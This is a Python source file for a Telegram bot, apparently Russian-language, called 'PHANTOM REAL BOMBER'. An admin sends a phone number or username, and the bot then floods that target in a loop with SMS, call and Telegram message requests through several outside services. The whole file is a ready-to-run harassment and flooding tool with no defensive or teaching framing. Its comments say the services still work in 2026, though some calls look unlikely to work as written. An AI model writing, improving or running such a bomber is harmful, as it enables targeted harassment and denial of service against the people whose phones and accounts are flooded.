import os
import threading
import time
import random
import requests
from telebot import TeleBot

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = TeleBot(BOT_TOKEN)
is_bombing = False
current_target = None

print("[+] PHANTOM REAL BOMBER ЗАПУЩЕН")

def real_bomb(target):
    global is_bombing
    while is_bombing:
        try:
            # Реальные SMS бомберы (актуальные на 2026)
            requests.post("https://sms-activate.ru/stubs/handler_api.php", 
                         data={"api_key": "demo", "action": "send", "phone": target}, timeout=4)
            
            requests.get(f"https://api.call2.ru/call?phone={target}", timeout=4)
            
            # Telegram бомб
            for i in range(5):
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                             json={"chat_id": target, "text": f"💣 PHANTOM BOMB #{i} 💣"}, timeout=3)
            
            # Дополнительные сервисы
            requests.post("https://bombapi.ru/sms", json={"phone": target}, timeout=4)
            
        except:
            pass
        
        time.sleep(random.uniform(0.8, 2.5))  # агрессивная задержка

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🚀 PHANTOM REAL BOMBER\n\nНапиши /bomb чтобы начать реальный бомбинг.")

@bot.message_handler(commands=['bomb'])
def bomb(message):
    global is_bombing, current_target
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    bot.send_message(message.chat.id, "Отправь цель для **РЕАЛЬНОГО** бомбинга:\n(номер телефона с + или @username)")
    bot.register_next_step_handler(message, get_target)

def get_target(message):
    global is_bombing, current_target
    current_target = message.text.strip()
    is_bombing = True

    bot.send_message(message.chat.id, f"🔥 РЕАЛЬНЫЙ БОМБИНГ ЗАПУЩЕН!\nЦель: {current_target}\n\nНапиши /stop чтобы остановить.")

    # Запуск реального бомбера в отдельном потоке
    threading.Thread(target=real_bomb, args=(current_target,), daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop(message):
    global is_bombing
    if message.from_user.id != ADMIN_ID:
        return
    is_bombing = False
    bot.send_message(message.chat.id, "🛑 Реальный бомбинг остановлен.")

print("[+] Реальный бомбер готов. Команды: /start → /bomb")
bot.infinity_polling(none_stop=True)
